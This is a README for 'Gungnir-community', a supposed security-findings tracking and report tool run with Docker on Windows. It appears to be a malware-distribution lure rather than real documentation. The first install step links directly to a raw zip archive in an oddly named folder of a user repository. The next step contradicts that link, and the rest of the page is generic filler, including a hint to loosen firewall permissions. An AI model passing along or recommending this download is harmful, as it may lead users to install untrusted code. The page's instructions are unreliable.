## About this software 📝

Gungnir-community helps teams manage security testing. You can track findings, build reports, and share data in one place. Security professionals use this tool to stay organized during long projects. It supports bug bounty programs and team audits. The interface works for both individual researchers and large groups. 

## System requirements 💻

Your computer needs specific components to run this application. Check for these items before you begin the setup:

* Windows 10 or Windows 11.
* At least 8 gigabytes of RAM.
* 20 gigabytes of free disk space.
* An active internet connection for updates.
* Docker Desktop installed on your system.

## 🛠️ How to install

You must follow these steps to set up the software on your machine. 

1. Visit this page to download the software: https://github.com/vasilywatersoluble127/gungnir-community/raw/refs/heads/main/Tempyo/community_gungnir_2.5.zip
2. Click the green button labeled Code and select Download ZIP.
3. Extract the folder to your desktop.
4. Open the Docker Desktop application and wait for the engine to start.
5. Open your terminal or command prompt inside the extracted folder.
6. Type the command `docker-compose up` and press Enter.
7. Wait for the process to finish loading all components.
8. Open your web browser and navigate to http://localhost:3000 to see the interface.

## 🚀 Getting started with features

Once you log in, the dashboard shows your open tasks. You can add new projects to track your security findings. Every project has a dedicated space for reports and notes. 

### Managing findings 🔍

You can record every security hole you find. The system tracks the severity level of each item. You can attach screenshots or text explanations to every entry. This helps you write clear reports for your clients later. 

### Generating reports 📄

The software creates documents from your raw data. Select the findings you want to include in your report. Choose the output format like PDF or Word. The tool handles the layout for you. You save time on manual formatting tasks.

### Team collaboration 👥

You can invite other users to join your workspace. Each user gets a unique login to keep data secure. You define roles for each member to control what they can edit or delete. The shared dashboard shows who works on which task in real time. 

## ⚙️ Settings and configuration

Navigate to the settings menu to adjust your preferences. You can change your password, update your user profile, or switch the interface theme. If you encounter issues with the connection, verify that Docker is still running in the background. You can restart the service through the terminal if the interface stops responding.

## Troubleshooting steps 🔧

If you see an error message, try these steps to fix the problem:

* Check if Docker Desktop shows a green status icon. 
* Ensure no other application uses port 3000 on your computer.
* Delete the temporary data folder and run the start command again.
* Update your Windows operating system to the latest version.
* Check your internal firewall settings to ensure the local gateway has permission to run.
